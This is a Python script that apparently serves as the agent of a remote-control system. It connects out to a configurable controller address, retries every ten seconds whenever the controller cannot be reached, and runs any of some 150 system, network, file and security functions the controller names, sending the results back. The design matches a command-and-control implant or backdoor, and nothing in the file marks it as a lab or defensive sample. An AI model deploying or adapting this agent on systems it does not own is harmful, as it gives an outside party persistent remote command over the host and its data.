import socket
import json
import time
import sys
from modules import system, network, files, interaction, security

# Merge all 150 functions into one massive Action Map
action_map = {
    **system.functions,
    **network.functions,
    **files.functions,
    **interaction.functions,
    **security.functions
}

def execute_action(action, params):
    """Safely executes a function from the action map."""
    if action in action_map:
        try:
            # Call the function dynamically with params
            return action_map[action](params)
        except Exception as e:
            return {"status": "error", "message": f"Execution failed: {str(e)}"}
    return {"status": "error", "message": f"Action '{action}' not found."}

def start_agent():
    # Configuration - Change IP/Port to match your Controller
    CONTROLLER_IP = '127.0.0.1' 
    CONTROLLER_PORT = 65432

    print(f"[*] Agent initialized with {len(action_map)} functions.")
    
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((CONTROLLER_IP, CONTROLLER_PORT))
                print("[*] Connected to Controller.")

                while True:
                    # Receive data
                    data = s.recv(4096).decode()
                    if not data: break

                    # Parse command
                    try:
                        request = json.loads(data)
                        action = request.get("action")
                        params = request.get("params", {})
                        
                        if action == "exit": break

                        # Execute
                        response = execute_action(action, params)
                        s.sendall(json.dumps(response).encode())

                    except json.JSONDecodeError:
                        s.sendall(json.dumps({"status": "error", "message": "Invalid JSON"}).encode())

        except (ConnectionRefusedError, socket.error):
            print("[-] Controller unreachable. Retrying in 10 seconds...")
            time.sleep(10)
        except Exception as e:
            print(f"[-] Critical error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    start_agent()
